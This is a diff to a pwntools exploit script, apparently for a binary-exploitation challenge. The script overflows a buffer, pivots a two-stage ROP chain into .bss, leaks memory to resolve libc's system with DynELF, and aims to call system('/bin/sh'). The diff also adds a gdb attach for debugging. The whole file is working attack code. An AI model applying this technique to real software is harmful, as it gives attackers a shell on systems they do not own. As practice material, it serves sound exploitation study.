@@ -26,10 +26,11 @@ padding = cyclic(cyclic_find('kaab'))
 rex  = ELF(binary)
 
 def myrop(base = None):
-    with context.local(log_level = 'silent'):
+    with context.local(log_level = 'WARNING'):
         return ROP(rex, base = base)
 
 # Our goal from here is to dynamically resolve the address for system
+# to do this, we migrate between two ROP chains in the .bss section
 addrs = [rex.bss(0x200), rex.bss(0x300)]
 cur_addr = addrs[0]
 
@@ -37,7 +38,11 @@ cur_addr = addrs[0]
 rop = myrop()
 rop.read(0, cur_addr, 0x100)
 rop.migrate(cur_addr)
-log.info("Stage 1 Rop:\n%s" % '\n'.join(rop.dump()))
+log.info("Stage 1 Rop:\n%s" % (rop.dump()))
+gdb.attach(r, '''
+b *0x804841c
+''')
+pause()
 r.send(padding + str(rop))
 
 # Now we create a memleaker, so we can use DynELF
@@ -55,7 +60,7 @@ def leak(addr, length = 0x100):
     return r.recvn(length)
 
 # Use the memleaker to resolve system from libc
-resolver = DynELF.from_elf(leak, rex)
+resolver = DynELF(leak, elf=rex)
 system = resolver.lookup('system')
 
 # Call system('/bin/sh')
